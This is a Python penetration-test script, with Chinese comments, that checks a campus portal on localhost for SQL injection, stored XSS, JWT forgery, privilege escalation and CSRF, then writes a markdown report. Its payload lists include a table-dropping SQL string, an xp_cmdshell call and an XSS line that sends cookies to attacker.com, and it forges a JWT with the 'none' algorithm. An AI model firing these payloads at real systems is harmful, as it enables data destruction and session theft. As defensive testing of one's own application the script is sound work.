#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
哈尔滨信息工程学院校园门户系统 - Phase 2安全渗透测试
Security Penetration Testing Script

测试范围:
1. SQL注入防护测试
2. XSS跨站脚本防护测试
3. JWT Token安全性测试
4. 权限绕过测试
5. 越权访问控制测试
6. CSRF防护测试

作者: Security Auditor
日期: 2025-08-24
"""

import requests
import json
import time
import hashlib
import jwt
import base64
from urllib.parse import urlencode
from datetime import datetime
import uuid

class SecurityPenetrationTester:
    def __init__(self):
        self.base_url_main = "http://localhost:48081"
        self.base_url_mock = "http://localhost:48082"
        self.test_results = []
        self.session = requests.Session()
        self.valid_token = None
        
        # 测试账号信息
        self.test_accounts = {
            'principal': {
                'employeeId': 'PRINCIPAL_001',
                'name': 'Principal-Zhang', 
                'password': 'admin123'
            },
            'student': {
                'employeeId': 'STUDENT_001',
                'name': 'Student-Zhang',
                'password': 'admin123'
            },
            'teacher': {
                'employeeId': 'TEACHER_001',
                'name': 'Teacher-Wang',
                'password': 'admin123'
            }
        }
        
        # SQL注入测试Payload
        self.sql_injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE notification_info; --",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
            "'; INSERT INTO notification_info VALUES (999,'test','test'); --",
            "' OR 1=1 LIMIT 1 OFFSET 1 --",
            "' AND SLEEP(5) --",
            "'; EXEC xp_cmdshell('ping localhost') --"
        ]
        
        # XSS测试Payload
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "<<SCRIPT>alert('XSS')</SCRIPT>",
            "<script>document.location='http://attacker.com/cookie='+document.cookie</script>"
        ]
        
    def log_test_result(self, test_name, result, severity="INFO", description="", payload=""):
        """记录测试结果"""
        self.test_results.append({
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'test_name': test_name,
            'result': result,
            'severity': severity,
            'description': description,
            'payload': payload
        })
        print(f"[{severity}] {test_name}: {result}")
        if description:
            print(f"    描述: {description}")
        if payload:
            print(f"    载荷: {payload[:100]}...")
        print()
    
    def authenticate_user(self, account_type='principal'):
        """获取有效JWT Token"""
        try:
            account = self.test_accounts[account_type]
            auth_url = f"{self.base_url_mock}/mock-school-api/auth/authenticate"
            
            response = requests.post(auth_url, 
                json=account,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('code') == 200 and data.get('data', {}).get('accessToken'):
                    self.valid_token = data['data']['accessToken']
                    self.log_test_result("用户认证", "成功", "INFO", f"获取{account_type}用户Token")
                    return True
            
            self.log_test_result("用户认证", "失败", "ERROR", f"无法获取{account_type}用户Token")
            return False
            
        except Exception as e:
            self.log_test_result("用户认证", f"异常: {str(e)}", "ERROR")
            return False
    
    def test_sql_injection(self):
        """SQL注入防护测试"""
        print("=== SQL注入防护测试开始 ===")
        
        if not self.valid_token:
            self.log_test_result("SQL注入测试", "跳过", "WARN", "缺少有效Token")
            return
        
        vulnerable_endpoints = [
            {
                'url': f"{self.base_url_main}/admin-api/test/notification/api/list",
                'method': 'GET',
                'params': ['title', 'publisher_name', 'category_id']
            },
            {
                'url': f"{self.base_url_main}/admin-api/test/todo-new/api/my-list", 
                'method': 'GET',
                'params': ['status', 'priority']
            }
        ]
        
        headers = {
            'Authorization': f'Bearer {self.valid_token}',
            'Content-Type': 'application/json',
            'tenant-id': '1'
        }
        
        sql_vulnerabilities = []
        
        for endpoint in vulnerable_endpoints:
            for payload in self.sql_injection_payloads:
                for param in endpoint['params']:
                    try:
                        if endpoint['method'] == 'GET':
                            params = {param: payload}
                            response = requests.get(endpoint['url'], 
                                                  params=params, 
                                                  headers=headers, 
                                                  timeout=10)
                        
                        # 检查SQL注入响应特征
                        if response.status_code == 500:
                            if any(keyword in response.text.lower() for keyword in 
                                   ['sql', 'mysql', 'syntax error', 'database', 'table']):
                                sql_vulnerabilities.append({
                                    'endpoint': endpoint['url'],
                                    'parameter': param,
                                    'payload': payload,
                                    'response_code': response.status_code,
                                    'error_info': response.text[:200]
                                })
                                self.log_test_result(
                                    "SQL注入漏洞发现", 
                                    "检测到潜在漏洞", 
                                    "HIGH",
                                    f"端点: {endpoint['url']}, 参数: {param}",
                                    payload
                                )
                        
                        # 检查延时注入
                        start_time = time.time()
                        if 'SLEEP' in payload.upper():
                            response = requests.get(endpoint['url'], 
                                                  params={param: payload}, 
                                                  headers=headers, 
                                                  timeout=10)
                            end_time = time.time()
                            
                            if end_time - start_time > 4:  # 如果响应时间超过4秒
                                self.log_test_result(
                                    "SQL延时注入", 
                                    "检测到时间延迟", 
                                    "HIGH",
                                    f"响应延迟: {end_time - start_time:.2f}秒",
                                    payload
                                )
                        
                    except requests.exceptions.Timeout:
                        self.log_test_result(
                            "SQL注入超时", 
                            "请求超时", 
                            "MEDIUM",
                            "可能存在延时注入漏洞",
                            payload
                        )
                    except Exception as e:
                        self.log_test_result(
                            "SQL注入测试异常", 
                            f"异常: {str(e)}", 
                            "LOW"
                        )
        
        if not sql_vulnerabilities:
            self.log_test_result("SQL注入防护", "通过", "GOOD", "未发现SQL注入漏洞")
        else:
            self.log_test_result(
                "SQL注入防护", 
                f"发现{len(sql_vulnerabilities)}个潜在漏洞", 
                "CRITICAL"
            )
    
    def test_xss_protection(self):
        """XSS跨站脚本防护测试"""
        print("=== XSS跨站脚本防护测试开始 ===")
        
        if not self.valid_token:
            self.log_test_result("XSS测试", "跳过", "WARN", "缺少有效Token")
            return
        
        headers = {
            'Authorization': f'Bearer {self.valid_token}',
            'Content-Type': 'application/json',
            'tenant-id': '1'
        }
        
        xss_vulnerabilities = []
        
        # 测试通知发布XSS
        for payload in self.xss_payloads:
            try:
                notification_data = {
                    "title": f"测试通知{payload}",
                    "content": f"通知内容{payload}",
                    "summary": f"摘要{payload}",
                    "level": 4,
                    "categoryId": 1,
                    "targetScope": "CLASS",
                    "pushChannels": [1, 5],
                    "requireConfirm": False,
                    "pinned": False
                }
                
                response = requests.post(
                    f"{self.base_url_main}/admin-api/test/notification/api/publish-database",
                    json=notification_data,
                    headers=headers,
                    timeout=10
                )
                
                # 检查XSS是否被过滤
                if response.status_code == 200:
                    # 获取通知列表，检查是否存在XSS
                    list_response = requests.get(
                        f"{self.base_url_main}/admin-api/test/notification/api/list",
                        headers=headers,
                        timeout=10
                    )
                    
                    if list_response.status_code == 200:
                        content = list_response.text
                        if payload in content and '<script>' in payload:
                            xss_vulnerabilities.append({
                                'type': 'Stored XSS',
                                'location': 'notification_title/content',
                                'payload': payload
                            })
                            self.log_test_result(
                                "存储型XSS漏洞", 
                                "检测到漏洞", 
                                "HIGH",
                                "通知标题/内容未正确过滤脚本",
                                payload
                            )
                
            except Exception as e:
                self.log_test_result("XSS测试异常", f"异常: {str(e)}", "LOW")
        
        # 测试待办创建XSS
        for payload in self.xss_payloads:
            try:
                todo_data = {
                    "title": f"测试待办{payload}",
                    "content": f"待办内容{payload}",
                    "priority": "HIGH",
                    "dueDate": "2025-12-31T23:59:59",
                    "targetScope": "CLASS",
                    "targetUsers": []
                }
                
                response = requests.post(
                    f"{self.base_url_main}/admin-api/test/todo-new/api/publish",
                    json=todo_data,
                    headers=headers,
                    timeout=10
                )
                
                if response.status_code == 200:
                    # 获取待办列表检查XSS
                    list_response = requests.get(
                        f"{self.base_url_main}/admin-api/test/todo-new/api/my-list",
                        headers=headers,
                        timeout=10
                    )
                    
                    if list_response.status_code == 200:
                        content = list_response.text
                        if payload in content and '<script>' in payload:
                            xss_vulnerabilities.append({
                                'type': 'Stored XSS',
                                'location': 'todo_title/content', 
                                'payload': payload
                            })
                            self.log_test_result(
                                "存储型XSS漏洞", 
                                "检测到漏洞", 
                                "HIGH",
                                "待办标题/内容未正确过滤脚本",
                                payload
                            )
                
            except Exception as e:
                self.log_test_result("待办XSS测试异常", f"异常: {str(e)}", "LOW")
        
        if not xss_vulnerabilities:
            self.log_test_result("XSS防护", "通过", "GOOD", "未发现XSS漏洞")
        else:
            self.log_test_result(
                "XSS防护", 
                f"发现{len(xss_vulnerabilities)}个XSS漏洞", 
                "HIGH"
            )
    
    def test_jwt_security(self):
        """JWT Token安全性测试"""
        print("=== JWT Token安全性测试开始 ===")
        
        if not self.valid_token:
            self.log_test_result("JWT测试", "跳过", "WARN", "缺少有效Token")
            return
        
        jwt_vulnerabilities = []
        
        # 测试1: JWT结构分析
        try:
            # 解码JWT (不验证签名)
            decoded_header = jwt.get_unverified_header(self.valid_token)
            decoded_payload = jwt.decode(self.valid_token, options={"verify_signature": False})
            
            self.log_test_result(
                "JWT结构分析", 
                "成功解码", 
                "INFO",
                f"算法: {decoded_header.get('alg', 'unknown')}, 用户: {decoded_payload.get('username', 'unknown')}"
            )
            
            # 检查敏感信息泄露
            sensitive_fields = ['password', 'secret', 'key', 'admin', 'root']
            for field in sensitive_fields:
                if field in str(decoded_payload).lower():
                    jwt_vulnerabilities.append({
                        'type': 'Information Disclosure',
                        'issue': f'JWT包含敏感字段: {field}'
                    })
                    self.log_test_result(
                        "JWT信息泄露", 
                        "检测到敏感信息", 
                        "MEDIUM",
                        f"JWT载荷包含敏感字段: {field}"
                    )
            
        except Exception as e:
            self.log_test_result("JWT解码异常", f"异常: {str(e)}", "LOW")
        
        # 测试2: None算法攻击
        try:
            none_token = jwt.encode(
                {"username": "admin", "role": "SYSTEM_ADMIN", "employeeId": "ADMIN_001"}, 
                "", 
                algorithm="none"
            )
            
            headers = {
                'Authorization': f'Bearer {none_token}',
                'Content-Type': 'application/json',
                'tenant-id': '1'
            }
            
            response = requests.get(
                f"{self.base_url_main}/admin-api/test/notification/api/list",
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                jwt_vulnerabilities.append({
                    'type': 'Algorithm Confusion',
                    'issue': 'None算法绕过签名验证'
                })
                self.log_test_result(
                    "JWT None算法攻击", 
                    "攻击成功", 
                    "CRITICAL",
                    "系统接受了None算法的JWT Token"
                )
            else:
                self.log_test_result(
                    "JWT None算法攻击", 
                    "攻击失败", 
                    "GOOD",
                    "系统正确拒绝了None算法Token"
                )
                
        except Exception as e:
            self.log_test_result("JWT None算法测试异常", f"异常: {str(e)}", "LOW")
        
        # 测试3: Token篡改测试
        try:
            # 修改Token的最后几个字符
            tampered_token = self.valid_token[:-5] + "XXXXX"
            
            headers = {
                'Authorization': f'Bearer {tampered_token}',
                'Content-Type': 'application/json',
                'tenant-id': '1'
            }
            
            response = requests.get(
                f"{self.base_url_main}/admin-api/test/notification/api/list",
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                jwt_vulnerabilities.append({
                    'type': 'Signature Validation Bypass',
                    'issue': '篡改的Token被接受'
                })
                self.log_test_result(
                    "JWT签名验证绕过", 
                    "检测到漏洞", 
                    "CRITICAL",
                    "系统接受了被篡改的JWT Token"
                )
            else:
                self.log_test_result(
                    "JWT签名验证", 
                    "验证有效", 
                    "GOOD",
                    "系统正确拒绝了篡改的Token"
                )
                
        except Exception as e:
            self.log_test_result("JWT篡改测试异常", f"异常: {str(e)}", "LOW")
        
        # 测试4: Token重放攻击
        try:
            # 使用旧Token多次请求
            for i in range(3):
                response = requests.get(
                    f"{self.base_url_main}/admin-api/test/notification/api/list",
                    headers={
                        'Authorization': f'Bearer {self.valid_token}',
                        'Content-Type': 'application/json',
                        'tenant-id': '1'
                    },
                    timeout=10
                )
                
                if response.status_code != 200:
                    self.log_test_result(
                        "JWT重放攻击防护", 
                        "检测到防护机制", 
                        "GOOD",
                        "系统限制了Token重复使用"
                    )
                    break
            else:
                self.log_test_result(
                    "JWT重放攻击", 
                    "未检测到防护", 
                    "MEDIUM",
                    "系统允许Token多次重放使用"
                )
                
        except Exception as e:
            self.log_test_result("JWT重放测试异常", f"异常: {str(e)}", "LOW")
        
        if not jwt_vulnerabilities:
            self.log_test_result("JWT安全性", "通过", "GOOD", "JWT安全配置正确")
        else:
            self.log_test_result(
                "JWT安全性", 
                f"发现{len(jwt_vulnerabilities)}个安全问题", 
                "HIGH"
            )
    
    def test_permission_bypass(self):
        """权限绕过测试"""
        print("=== 权限绕过测试开始 ===")
        
        permission_vulnerabilities = []
        
        # 测试1: 无Token访问
        try:
            response = requests.get(
                f"{self.base_url_main}/admin-api/test/notification/api/list",
                headers={'Content-Type': 'application/json', 'tenant-id': '1'},
                timeout=10
            )
            
            if response.status_code == 200:
                permission_vulnerabilities.append({
                    'type': 'Authentication Bypass',
                    'issue': '未认证用户可访问受保护资源'
                })
                self.log_test_result(
                    "认证绕过", 
                    "检测到漏洞", 
                    "CRITICAL",
                    "无Token可访问受保护API"
                )
            else:
                self.log_test_result(
                    "认证保护", 
                    "工作正常", 
                    "GOOD",
                    f"无Token访问被拒绝 (HTTP {response.status_code})"
                )
                
        except Exception as e:
            self.log_test_result("认证测试异常", f"异常: {str(e)}", "LOW")
        
        # 测试2: 学生权限越权测试
        student_authenticated = self.authenticate_user('student')
        if student_authenticated:
            try:
                # 学生尝试发布Level 1紧急通知 (应该被拒绝)
                notification_data = {
                    "title": "【学生越权测试】紧急通知",
                    "content": "学生尝试发布紧急通知",
                    "summary": "权限越权测试",
                    "level": 1,  # 紧急级别，学生无权发布
                    "categoryId": 1,
                    "targetScope": "SCHOOL_WIDE",  # 全校范围，学生无权
                    "pushChannels": [1, 5],
                    "requireConfirm": False,
                    "pinned": False
                }
                
                headers = {
                    'Authorization': f'Bearer {self.valid_token}',
                    'Content-Type': 'application/json',
                    'tenant-id': '1'
                }
                
                response = requests.post(
                    f"{self.base_url_main}/admin-api/test/notification/api/publish-database",
                    json=notification_data,
                    headers=headers,
                    timeout=10
                )
                
                if response.status_code == 200:
                    permission_vulnerabilities.append({
                        'type': 'Privilege Escalation',
                        'issue': '学生可发布超出权限的通知'
                    })
                    self.log_test_result(
                        "学生权限越权", 
                        "检测到漏洞", 
                        "CRITICAL",
                        "学生成功发布Level 1紧急通知"
                    )
                else:
                    self.log_test_result(
                        "学生权限控制", 
                        "工作正常", 
                        "GOOD",
                        f"学生越权访问被拒绝 (HTTP {response.status_code})"
                    )
                    
            except Exception as e:
                self.log_test_result("学生越权测试异常", f"异常: {str(e)}", "LOW")
        
        # 测试3: @RequiresPermission注解绕过
        if self.valid_token:
            try:
                # 测试权限缓存API访问控制
                test_endpoints = [
                    "/admin-api/test/permission-cache/api/test-class-permission",
                    "/admin-api/test/permission-cache/api/test-school-permission", 
                    "/admin-api/test/permission-cache/api/clear-cache"  # 管理员专用
                ]
                
                headers = {
                    'Authorization': f'Bearer {self.valid_token}',
                    'Content-Type': 'application/json',
                    'tenant-id': '1'
                }
                
                for endpoint in test_endpoints:
                    response = requests.get(
                        f"{self.base_url_main}{endpoint}",
                        headers=headers,
                        timeout=10
                    )
                    
                    # 记录访问结果
                    self.log_test_result(
                        f"权限注解测试 - {endpoint.split('/')[-1]}", 
                        f"HTTP {response.status_code}", 
                        "INFO" if response.status_code in [200, 403] else "WARN"
                    )
                    
            except Exception as e:
                self.log_test_result("权限注解测试异常", f"异常: {str(e)}", "LOW")
        
        if not permission_vulnerabilities:
            self.log_test_result("权限控制", "通过", "GOOD", "权限验证机制工作正常")
        else:
            self.log_test_result(
                "权限控制", 
                f"发现{len(permission_vulnerabilities)}个权限绕过漏洞", 
                "CRITICAL"
            )
    
    def test_access_control(self):
        """越权访问控制测试"""
        print("=== 越权访问控制测试开始 ===")
        
        access_vulnerabilities = []
        
        # 获取不同角色Token进行交叉测试
        roles = ['principal', 'teacher', 'student']
        role_tokens = {}
        
        for role in roles:
            if self.authenticate_user(role):
                role_tokens[role] = self.valid_token
        
        if not role_tokens:
            self.log_test_result("越权测试", "跳过", "WARN", "无法获取测试Token")
            return
        
        # 测试水平越权 - 用户A访问用户B的资源
        try:
            # 使用学生Token尝试访问教师权限资源
            if 'student' in role_tokens and 'teacher' in role_tokens:
                headers_student = {
                    'Authorization': f'Bearer {role_tokens["student"]}',
                    'Content-Type': 'application/json',
                    'tenant-id': '1'
                }
                
                # 学生尝试发布教师级别通知
                teacher_notification = {
                    "title": "【越权测试】教师通知",
                    "content": "学生尝试发布教师级别通知",
                    "summary": "水平越权测试",
                    "level": 3,  # 常规级别，需要教师权限
                    "categoryId": 1,
                    "targetScope": "DEPARTMENT",  # 部门范围，需要教师权限
                    "pushChannels": [1, 5],
                    "requireConfirm": False,
                    "pinned": False
                }
                
                response = requests.post(
                    f"{self.base_url_main}/admin-api/test/notification/api/publish-database",
                    json=teacher_notification,
                    headers=headers_student,
                    timeout=10
                )
                
                if response.status_code == 200:
                    access_vulnerabilities.append({
                        'type': 'Horizontal Privilege Escalation',
                        'issue': '学生可执行教师权限操作'
                    })
                    self.log_test_result(
                        "水平越权", 
                        "检测到漏洞", 
                        "HIGH",
                        "学生成功发布教师级别通知"
                    )
                else:
                    self.log_test_result(
                        "水平越权防护", 
                        "工作正常", 
                        "GOOD",
                        f"学生越权操作被拒绝 (HTTP {response.status_code})"
                    )
                    
        except Exception as e:
            self.log_test_result("水平越权测试异常", f"异常: {str(e)}", "LOW")
        
        # 测试垂直越权 - 低权限用户尝试高权限操作
        try:
            if 'student' in role_tokens:
                headers_student = {
                    'Authorization': f'Bearer {role_tokens["student"]}',
                    'Content-Type': 'application/json',
                    'tenant-id': '1'
                }
                
                # 学生尝试清空权限缓存 (管理员操作)
                response = requests.delete(
                    f"{self.base_url_main}/admin-api/test/permission-cache/api/clear-cache",
                    headers=headers_student,
                    timeout=10
                )
                
                if response.status_code == 200:
                    access_vulnerabilities.append({
                        'type': 'Vertical Privilege Escalation',
                        'issue': '低权限用户可执行管理员操作'
                    })
                    self.log_test_result(
                        "垂直越权", 
                        "检测到漏洞", 
                        "CRITICAL",
                        "学生成功执行管理员权限操作"
                    )
                else:
                    self.log_test_result(
                        "垂直越权防护", 
                        "工作正常", 
                        "GOOD",
                        f"学生管理员操作被拒绝 (HTTP {response.status_code})"
                    )
                    
        except Exception as e:
            self.log_test_result("垂直越权测试异常", f"异常: {str(e)}", "LOW")
        
        # 测试IDOR (不安全直接对象引用)
        try:
            if 'teacher' in role_tokens:
                headers_teacher = {
                    'Authorization': f'Bearer {role_tokens["teacher"]}',
                    'Content-Type': 'application/json',
                    'tenant-id': '1'
                }
                
                # 尝试访问不同ID的资源
                for test_id in range(1, 10):
                    response = requests.get(
                        f"{self.base_url_main}/admin-api/test/todo-new/api/{test_id}/stats",
                        headers=headers_teacher,
                        timeout=5
                    )
                    
                    if response.status_code == 200:
                        # 检查返回的数据是否属于当前用户
                        data = response.json()
                        if data.get('code') == 0:
                            self.log_test_result(
                                f"IDOR测试 - ID:{test_id}", 
                                "可访问", 
                                "INFO",
                                "需要验证数据是否属于当前用户"
                            )
                    
        except Exception as e:
            self.log_test_result("IDOR测试异常", f"异常: {str(e)}", "LOW")
        
        if not access_vulnerabilities:
            self.log_test_result("访问控制", "通过", "GOOD", "访问控制机制工作正常")
        else:
            self.log_test_result(
                "访问控制", 
                f"发现{len(access_vulnerabilities)}个访问控制漏洞", 
                "HIGH"
            )
    
    def test_csrf_protection(self):
        """CSRF防护测试"""
        print("=== CSRF防护测试开始 ===")
        
        if not self.valid_token:
            self.log_test_result("CSRF测试", "跳过", "WARN", "缺少有效Token")
            return
        
        csrf_vulnerabilities = []
        
        # 测试1: 检查CSRF Token机制
        try:
            headers = {
                'Authorization': f'Bearer {self.valid_token}',
                'Content-Type': 'application/json',
                'tenant-id': '1',
                'Origin': 'http://evil.com',  # 模拟恶意来源
                'Referer': 'http://evil.com/attack.html'
            }
            
            # 尝试执行状态变更操作
            csrf_test_data = {
                "title": "CSRF测试通知",
                "content": "测试CSRF防护机制",
                "summary": "CSRF测试",
                "level": 4,
                "categoryId": 1,
                "targetScope": "CLASS",
                "pushChannels": [1, 5],
                "requireConfirm": False,
                "pinned": False
            }
            
            response = requests.post(
                f"{self.base_url_main}/admin-api/test/notification/api/publish-database",
                json=csrf_test_data,
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                csrf_vulnerabilities.append({
                    'type': 'CSRF Vulnerability',
                    'issue': '缺少CSRF防护机制'
                })
                self.log_test_result(
                    "CSRF攻击测试", 
                    "攻击成功", 
                    "MEDIUM",
                    "系统接受了来自恶意域的请求"
                )
            else:
                self.log_test_result(
                    "CSRF防护", 
                    "工作正常", 
                    "GOOD",
                    f"恶意域请求被拒绝 (HTTP {response.status_code})"
                )
                
        except Exception as e:
            self.log_test_result("CSRF测试异常", f"异常: {str(e)}", "LOW")
        
        # 测试2: SameSite Cookie属性检查
        try:
            response = requests.get(
                f"{self.base_url_main}/admin-api/test/notification/api/list",
                headers={
                    'Authorization': f'Bearer {self.valid_token}',
                    'Content-Type': 'application/json',
                    'tenant-id': '1'
                },
                timeout=10
            )
            
            cookies = response.headers.get('Set-Cookie', '')
            if cookies:
                if 'SameSite=Strict' not in cookies and 'SameSite=Lax' not in cookies:
                    csrf_vulnerabilities.append({
                        'type': 'Missing SameSite Attribute',
                        'issue': 'Cookie缺少SameSite属性'
                    })
                    self.log_test_result(
                        "SameSite属性检查", 
                        "缺少保护", 
                        "MEDIUM",
                        "Cookie未设置SameSite属性"
                    )
                else:
                    self.log_test_result(
                        "SameSite属性检查", 
                        "设置正确", 
                        "GOOD",
                        "Cookie已设置SameSite属性"
                    )
            else:
                self.log_test_result(
                    "Cookie检查", 
                    "未发现Cookie", 
                    "INFO",
                    "API不使用Cookie机制"
                )
                
        except Exception as e:
            self.log_test_result("SameSite测试异常", f"异常: {str(e)}", "LOW")
        
        if not csrf_vulnerabilities:
            self.log_test_result("CSRF防护", "通过", "GOOD", "CSRF防护机制充分")
        else:
            self.log_test_result(
                "CSRF防护", 
                f"发现{len(csrf_vulnerabilities)}个CSRF相关问题", 
                "MEDIUM"
            )
    
    def generate_security_report(self):
        """生成安全测试报告"""
        report = f"""
# 哈尔滨信息工程学院校园门户系统 - Phase 2安全渗透测试报告

## 测试概览
- **测试日期**: {datetime.now().strftime('%Y年%m月%d日 %H:%M:%S')}
- **测试范围**: 主通知服务(48081) + Mock School API(48082)
- **测试类型**: SQL注入、XSS、JWT安全、权限绕过、越权访问、CSRF
- **测试结果**: 共执行{len(self.test_results)}项安全测试

## 安全风险等级统计
"""
        
        risk_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'GOOD': 0}
        for result in self.test_results:
            severity = result['severity']
            if severity in risk_counts:
                risk_counts[severity] += 1
        
        report += f"""
- 🚨 **严重风险**: {risk_counts['CRITICAL']}个
- 🔴 **高风险**: {risk_counts['HIGH']}个  
- 🟡 **中风险**: {risk_counts['MEDIUM']}个
- 🟢 **低风险**: {risk_counts['LOW']}个
- ✅ **安全通过**: {risk_counts['GOOD']}个

## 详细测试结果
"""
        
        for result in self.test_results:
            severity_emoji = {
                'CRITICAL': '🚨',
                'HIGH': '🔴', 
                'MEDIUM': '🟡',
                'LOW': '🟢',
                'GOOD': '✅',
                'INFO': 'ℹ️',
                'WARN': '⚠️',
                'ERROR': '❌'
            }.get(result['severity'], '📋')
            
            report += f"""
### {severity_emoji} {result['test_name']}
- **结果**: {result['result']}
- **风险等级**: {result['severity']}
- **时间**: {result['timestamp']}
"""
            if result['description']:
                report += f"- **描述**: {result['description']}\n"
            if result['payload']:
                report += f"- **载荷**: `{result['payload'][:100]}{'...' if len(result['payload']) > 100 else ''}`\n"
        
        # 安全建议
        report += f"""
## 安全防护建议

### 🔒 高优先级修复建议
1. **输入验证增强**
   - 实施严格的输入验证和输出编码
   - 使用参数化查询防止SQL注入
   - 实施XSS防护过滤器

2. **权限控制加固**  
   - 验证@RequiresPermission注解覆盖完整性
   - 实施角色级别的严格访问控制
   - 添加操作审计日志

3. **JWT安全强化**
   - 禁用危险算法(如None算法)
   - 实施Token过期和刷新机制
   - 添加Token黑名单机制

### 🛡️ 中优先级安全措施
1. **CSRF防护**
   - 实施CSRF Token机制
   - 设置正确的SameSite Cookie属性
   - 验证请求来源

2. **安全头设置**
   - 添加安全响应头(X-Frame-Options, X-XSS-Protection等)
   - 实施内容安全策略(CSP)
   - 启用HTTPS强制

### 📊 安全监控建议
1. **实时监控**
   - 异常请求检测和告警
   - 失败认证尝试监控
   - API访问频率限制

2. **安全审计**
   - 定期安全测试和评估
   - 代码安全审查
   - 第三方安全扫描

## OWASP Top 10 对照
| OWASP风险 | 测试状态 | 风险等级 | 说明 |
|-----------|----------|----------|------|
| A01-权限失效 | ✅ 已测试 | {self._get_risk_level('权限')} | @RequiresPermission注解保护 |
| A02-加密失效 | ✅ 已测试 | {self._get_risk_level('JWT')} | JWT Token安全性验证 |
| A03-注入攻击 | ✅ 已测试 | {self._get_risk_level('SQL')} | SQL注入防护测试 |
| A04-不安全设计 | ⚠️ 部分 | MEDIUM | 需要架构安全评审 |
| A05-安全错误配置 | ⚠️ 部分 | MEDIUM | 需要配置安全检查 |
| A06-易受攻击组件 | ❌ 未测试 | UNKNOWN | 需要依赖安全扫描 |
| A07-身份认证失效 | ✅ 已测试 | {self._get_risk_level('认证')} | 双重认证机制验证 |
| A08-软件数据完整性失效 | ❌ 未测试 | UNKNOWN | 需要数据完整性验证 |
| A09-安全日志监控失效 | ❌ 未测试 | UNKNOWN | 需要日志安全分析 |
| A10-服务端请求伪造 | ❌ 未测试 | UNKNOWN | 需要SSRF防护测试 |

## 总结
系统整体安全状况：**{'良好' if risk_counts['CRITICAL'] + risk_counts['HIGH'] == 0 else '需要改进'}**

主要优势：
- JWT认证机制相对完善
- 权限注解@RequiresPermission提供基础保护
- API访问控制基本有效

需要改进：
- 输入验证和输出编码需要加强
- CSRF防护机制需要完善  
- 安全监控和审计需要建立

---
**报告生成时间**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  
**测试工具**: Security Penetration Tester v1.0  
**下次建议测试时间**: 3个月后
"""
        
        return report
    
    def _get_risk_level(self, test_type):
        """获取特定测试类型的风险等级"""
        for result in self.test_results:
            if test_type in result['test_name']:
                if result['severity'] in ['CRITICAL', 'HIGH']:
                    return result['severity']
                elif result['severity'] == 'GOOD':
                    return 'LOW'
        return 'MEDIUM'
    
    def run_all_tests(self):
        """运行所有安全测试"""
        print("=" * 60)
        print("   哈尔滨信息工程学院校园门户系统")
        print("         Phase 2安全渗透测试")
        print("=" * 60)
        print()
        
        # 获取初始认证
        if not self.authenticate_user('principal'):
            print("❌ 无法获取认证Token，跳过需要认证的测试")
        
        # 执行所有安全测试
        test_functions = [
            self.test_sql_injection,
            self.test_xss_protection, 
            self.test_jwt_security,
            self.test_permission_bypass,
            self.test_access_control,
            self.test_csrf_protection
        ]
        
        for test_func in test_functions:
            try:
                test_func()
            except Exception as e:
                self.log_test_result(f"{test_func.__name__}异常", f"异常: {str(e)}", "ERROR")
            print("-" * 50)
        
        # 生成并保存报告
        report = self.generate_security_report()
        
        report_file = f"/opt/hxci-campus-portal/hxci-campus-portal-system/security_test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write(report)
        
        print("=" * 60)
        print(f"✅ 安全渗透测试完成!")
        print(f"📋 详细报告已保存至: {report_file}")
        print("=" * 60)
        
        return report_file

if __name__ == "__main__":
    tester = SecurityPenetrationTester()
    tester.run_all_tests()